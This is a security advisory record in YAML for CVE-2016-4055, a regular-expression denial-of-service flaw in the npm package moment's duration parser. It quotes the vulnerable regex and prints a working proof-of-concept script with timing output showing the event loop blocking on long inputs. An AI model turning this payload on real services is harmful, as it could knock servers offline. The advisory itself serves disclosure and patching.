@@ -1,0 +1,44 @@
+advisory_id: npm-55
+datasource_id: nodejs_security_wg/npm-55
+datasource_url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/55.json
+aliases:
+  - CVE-2016-4055
+summary: "Regular Expression Denial of Service\nmoment is vulnerable to regular expression denial\
+  \ of service when user input is passed unchecked into moment.duration() blocking the event\
+  \ loop for a period of time.\n\n\"The Regular expression Denial of Service (ReDoS) is a Denial\
+  \ of Service attack, that exploits the fact that most Regular Expression implementations may\
+  \ reach extreme situations that cause them to work very slowly (exponentially related to input\
+  \ size). An attacker can then cause a program using a Regular Expression to enter these extreme\
+  \ situations and then hang for a very long time.\" [1]\n\nIt's not a huge amplification it\
+  \ takes about 25k characters to get 1.1 seconds however that's well under most servers max\
+  \ request size so it's certainly exploitable.\n\nThe regular expression in question \n\nmoment/2.10.6/moment.js\n\
+  ```\n1679     var aspNetRegex = /(\\-)?(?:(\\d*)\\.)?(\\d+)\\:(\\d+)(?:\\:(\\d+)\\.?(\\d{3})?)?/;\n\
+  ```\n\n\n### Proof of concept\n```\nvar moment = require('moment');\n\nvar genstr = function\
+  \ (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result\
+  \ + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=20000;i<=10000000;i=i+10000) {\n    console.log(\"\
+  COUNT: \" + i);\n    var str = '-' + genstr(i, '1')\n    console.log(\"LENGTH: \" + str.length);\n\
+  \    var start = process.hrtime();\n    moment.duration(str)\n\n    var end = process.hrtime(start);\n\
+  \    console.log(end);\n}\n```\n\n### Results\n```\n$ node moment.js\nCOUNT: 20000\nLENGTH:\
+  \ 20002\n[ 0, 618931029 ]\nCOUNT: 30001\nLENGTH: 30003\n[ 1, 401413894 ]\nCOUNT: 40002\nLENGTH:\
+  \ 40004\n[ 2, 437075303 ]\nCOUNT: 50003\nLENGTH: 50005\n[ 3, 824664804 ]\nCOUNT: 60004\nLENGTH:\
+  \ 60006\n[ 5, 651335262 ]\n```\n\n### Timeline:\n- 10/26/2015 - Initial Discovery\n- 10/26/2015\
+  \ - Maintainers notified via email\n- 12/16/2015 - Maintainers notified via email again\n\
+  - 2/2/2016 - Added information to fix from pull request\n- 2/3/2016 -"
+impacted_packages:
+  - purl: pkg:npm/moment
+    affected_versions: vers:npm/<2.11.2
+    fixed_versions: vers:npm/>=2.11.2
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
+    published_at: None
+    url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/55.json
+weaknesses: []
+references:
+  - url: https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
+    reference_type:
+    reference_id:
+  - url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/55.json
+    reference_type:
+    reference_id: 55
